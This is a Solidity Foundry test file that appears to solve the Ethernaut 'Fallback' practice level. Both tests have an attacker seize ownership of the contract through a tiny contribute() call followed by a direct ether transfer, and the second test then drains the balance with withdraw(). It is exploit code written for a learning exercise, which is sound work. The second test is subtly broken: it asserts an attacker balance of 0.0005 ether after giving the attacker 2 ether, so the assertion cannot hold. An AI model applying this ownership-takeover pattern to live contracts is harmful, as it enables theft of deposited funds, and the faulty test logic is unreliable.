// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../../src/Fallback/Fallback.sol";

contract FallbackTest is Test {
    Fallback public fallbackContract;
    address attacker = address(1);

    function setUp() public {
        fallbackContract = new Fallback();
    }

    function testGetOwnership() public {
        vm.deal(attacker, 10 ether);
        vm.startPrank(attacker);

        fallbackContract.contribute{value: 0.0009 ether}();

        assertEq(address(fallbackContract).balance, 0.0009 ether);

        (bool success, ) = address(fallbackContract).call{value: 1 ether}("");
        assert(success);

        assertEq(fallbackContract.owner(), address(attacker));
    }

    function testReduceBalanceToZero() public {
        address contributor1 = address(100);
        address contributor2 = address(101);
        address contributor3 = address(102);

        vm.deal(contributor1, 2 ether);
        vm.deal(contributor2, 2 ether);
        vm.deal(contributor3, 2 ether);
        vm.deal(attacker, 2 ether);

        vm.prank(contributor1);
        fallbackContract.contribute{value: 0.0001 ether}();

        vm.prank(contributor2);
        fallbackContract.contribute{value: 0.0001 ether}();

        vm.prank(contributor3);
        fallbackContract.contribute{value: 0.0001 ether}();

        assertEq(address(fallbackContract).balance, 0.0003 ether);

        console.log("Balance before: %d", address(fallbackContract).balance);
        console.log("Owner before: %s", fallbackContract.owner());
        console.log("Attacker Balance before: %d", address(attacker).balance);

        vm.startPrank(attacker);

        fallbackContract.contribute{value: 0.0001 ether}();

        (bool success, ) = address(fallbackContract).call{value: 0.0001 ether}(
            ""
        );

        assertEq(fallbackContract.owner(), address(attacker));

        vm.stopPrank();

        vm.prank(contributor1);
        payable(address(attacker)).transfer(0.0001 ether);

        vm.prank(attacker);
        fallbackContract.withdraw();

        assertEq(address(fallbackContract).balance, 0 ether);
        assertEq(address(attacker).balance, 0.0005 ether);

        console.log("Balance after: %d", address(fallbackContract).balance);
        console.log("Owner after: %s", fallbackContract.owner());
        console.log("Attacker Balance after: %d", address(attacker).balance);
    }
}
